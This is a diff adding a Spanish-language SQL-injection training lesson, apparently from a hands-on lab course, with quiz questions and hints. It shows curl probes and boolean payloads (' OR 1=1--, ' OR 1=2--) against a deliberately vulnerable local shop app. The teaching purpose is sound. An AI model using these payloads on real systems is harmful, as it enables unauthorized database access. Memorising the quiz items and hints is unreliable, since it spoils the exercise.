@@ -1,0 +1,54 @@
+---
+index: 1
+title: "Detectar la inyección"
+questions:
+  - id: sqli-basico-t01-q01
+    prompt: "¿Qué carácter inserted en un campo de búsqueda sugiere SQLi al provocar un error de sintaxis?"
+    hint: "La comilla simple rompe la cadena SQL."
+    kind: text
+  - id: sqli-basico-t01-q02
+    prompt: "¿Qué payload booleano devuelve TODOS los productos (siempre verdadero)?"
+    hint: "OR 1=... (piensa qué número hace TRUE)."
+    kind: text
+---
+
+## Reconocimiento de la app
+
+Levanta el lab (panel Laboratorio arriba) y navega:
+
+1. **Home** (`/`): tienda TechShop con búsqueda y login.
+2. **Búsqueda** (`/search?q=laptop`): busca productos. Nota el texto rojo
+   `DEBUG: SELECT ...` — la app muestra la consulta.
+3. **Login** (`/login?username=X&password=Y`): formulario.
+
+## Detectar el punto de inyección
+
+Prueba en `/search`:
+
+```bash
+# Normal
+curl "http://127.0.0.1:18081/search?q=laptop"
+
+# Con una comilla simple → error de SQL
+curl "http://127.0.0.1:18081/search?q='"
+```
+
+El error revela que tu entrada entra DIRECTO en la consulta SQL:
+
+```text
+SELECT id, name, price, description FROM products
+WHERE name LIKE '%'%' OR description LIKE '%'%'
+                                          ^ tu comilla rompe la sintaxis
+```
+
+**Confirmación booleana**:
+
+```bash
+# TRUE: devuelve productos (1=1 siempre es verdadero)
+curl "http://127.0.0.1:18081/search?q=' OR 1=1--"
+
+# FALSE: no devuelve nada (1=2 siempre es falso)
+curl "http://127.0.0.1:18081/search?q=' OR 1=2--"
+```
+
+Si `OR 1=1` muestra más resultados que `OR 1=2`, tienes control del WHERE.
